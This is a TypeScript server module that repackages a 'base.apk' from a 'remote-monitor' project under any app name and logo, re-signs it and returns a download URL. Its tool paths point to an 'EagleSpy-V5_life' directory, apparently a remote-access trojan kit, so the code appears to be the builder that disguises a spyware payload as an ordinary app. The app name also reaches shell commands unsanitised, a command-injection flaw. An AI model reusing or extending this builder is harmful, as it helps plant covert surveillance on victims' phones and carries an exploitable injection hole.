import { execSync } from "child_process";
import * as fs from "fs";
import * as path from "path";
import axios from "axios";

const APKTOOL_JAR = "/tmp/eaglespy-full/EagleSpy-V5_life/res/Lib/apktool.jar";
const APKSIGNER_JAR = "/tmp/eaglespy-full/EagleSpy-V5_life/res/Lib/apksigner.jar";
const BASE_APK = "/home/ubuntu/remote-monitor/public/base.apk";
const OUTPUT_DIR = "/home/ubuntu/remote-monitor/public/apks";

interface BuildOptions {
  appName: string;
  appUrl: string;
  logoUrl?: string;
  requestOrigin: string;
}

export async function buildAPKWithJava(options: BuildOptions) {
  const timestamp = Date.now();
  const randomSuffix = Math.random().toString(36).substring(7);
  const filename = `${options.appName}-${timestamp}-${randomSuffix}.apk`;
  const outputPath = path.join(OUTPUT_DIR, filename);
  
  try {
    console.log("[APK-BUILDER-JAVA] Starting APK build with Java...");
    console.log("[APK-BUILDER-JAVA] App name:", options.appName);
    console.log("[APK-BUILDER-JAVA] App URL:", options.appUrl);
    
    // Create temporary directory for extraction
    const tempDir = `/tmp/apk-build-${timestamp}`;
    const extractDir = path.join(tempDir, "extracted");
    const buildDir = path.join(tempDir, "build");
    
    fs.mkdirSync(extractDir, { recursive: true });
    fs.mkdirSync(buildDir, { recursive: true });
    
    console.log("[APK-BUILDER-JAVA] Temp directory:", tempDir);
    
    // Step 1: Decompile APK using apktool
    console.log("[APK-BUILDER-JAVA] Decompiling APK with apktool...");
    execSync(
      `java -jar "${APKTOOL_JAR}" d -f -o "${extractDir}" "${BASE_APK}" 2>&1 | tee "${tempDir}/apktool-decode.log"`,
      { stdio: "inherit", cwd: tempDir }
    );
    
    // Step 2: Modify AndroidManifest.xml to change app name
    const manifestPath = path.join(extractDir, "AndroidManifest.xml");
    if (fs.existsSync(manifestPath)) {
      console.log("[APK-BUILDER-JAVA] Modifying AndroidManifest.xml...");
      let manifest = fs.readFileSync(manifestPath, "utf-8");
      
      // Replace app label (this is a simplified approach)
      manifest = manifest.replace(
        /android:label="[^"]*"/g,
        `android:label="${options.appName}"`
      );
      
      fs.writeFileSync(manifestPath, manifest, "utf-8");
      console.log("[APK-BUILDER-JAVA] ✓ AndroidManifest.xml updated");
    }
    
    // Step 3: Download and replace logo if provided
    if (options.logoUrl) {
      console.log("[APK-BUILDER-JAVA] Downloading logo from:", options.logoUrl);
      try {
        const logoResponse = await axios.get(options.logoUrl, {
          responseType: "arraybuffer",
          timeout: 10000,
        });
        
        // Replace icon files
        const iconPaths = [
          path.join(extractDir, "res/drawable/claimedw70.png"),
          path.join(extractDir, "res/drawable-hdpi/ic_launcher.png"),
          path.join(extractDir, "res/drawable-mdpi/ic_launcher.png"),
          path.join(extractDir, "res/drawable-xhdpi/ic_launcher.png"),
          path.join(extractDir, "res/drawable-xxhdpi/ic_launcher.png"),
        ];
        
        for (const iconPath of iconPaths) {
          const iconDir = path.dirname(iconPath);
          if (!fs.existsSync(iconDir)) {
            fs.mkdirSync(iconDir, { recursive: true });
          }
          fs.writeFileSync(iconPath, logoResponse.data);
          console.log("[APK-BUILDER-JAVA] ✓ Updated:", iconPath);
        }
      } catch (error) {
        console.log("[APK-BUILDER-JAVA] Failed to download logo:", error instanceof Error ? error.message : String(error));
      }
    }
    
    // Step 4: Recompile APK with apktool
    console.log("[APK-BUILDER-JAVA] Recompiling APK with apktool...");
    const unsignedApk = path.join(buildDir, "unsigned.apk");
    execSync(
      `java -jar "${APKTOOL_JAR}" b -f -o "${unsignedApk}" "${extractDir}" 2>&1 | tee "${tempDir}/apktool-build.log"`,
      { stdio: "inherit", cwd: tempDir }
    );
    
    console.log("[APK-BUILDER-JAVA] ✓ APK recompiled:", unsignedApk);
    
    // Step 5: Sign APK with apksigner
    console.log("[APK-BUILDER-JAVA] Signing APK with apksigner...");
    
    // Create a keystore if it doesn't exist
    const keystorePath = "/home/ubuntu/remote-monitor/.keystore";
    if (!fs.existsSync(keystorePath)) {
      console.log("[APK-BUILDER-JAVA] Creating keystore...");
      execSync(
        `keytool -genkey -v -keystore "${keystorePath}" -keyalg RSA -keysize 2048 -validity 10000 -alias remote-monitor -storepass android -keypass android -dname "CN=Remote Monitor, O=Remote Monitor, C=BR" 2>&1`,
        { stdio: "inherit" }
      );
    }
    
    // Sign the APK
    execSync(
      `java -jar "${APKSIGNER_JAR}" sign --ks "${keystorePath}" --ks-pass pass:android --ks-key-alias remote-monitor --key-pass pass:android --out "${outputPath}" "${unsignedApk}" 2>&1 | tee "${tempDir}/apksigner.log"`,
      { stdio: "inherit", cwd: tempDir }
    );
    
    console.log("[APK-BUILDER-JAVA] ✓ APK signed:", outputPath);
    
    // Verify APK
    const stats = fs.statSync(outputPath);
    console.log("[APK-BUILDER-JAVA] Final APK size:", (stats.size / 1024 / 1024).toFixed(2), "MB");
    
    // Cleanup temp directory
    execSync(`rm -rf "${tempDir}"`);
    
    const downloadUrl = `${options.requestOrigin}/download/${filename}`;
    
    return {
      success: true,
      downloadUrl,
      filename,
      size: stats.size,
    };
  } catch (error) {
    console.error("[APK-BUILDER-JAVA] Error:", error instanceof Error ? error.message : String(error));
    
    // Cleanup on error
    try {
      execSync(`rm -rf /tmp/apk-build-${timestamp}`);
    } catch (e) {
      // Ignore cleanup errors
    }
    
    return {
      success: false,
      error: error instanceof Error ? error.message : String(error),
      downloadUrl: "",
      filename: "",
    };
  }
}
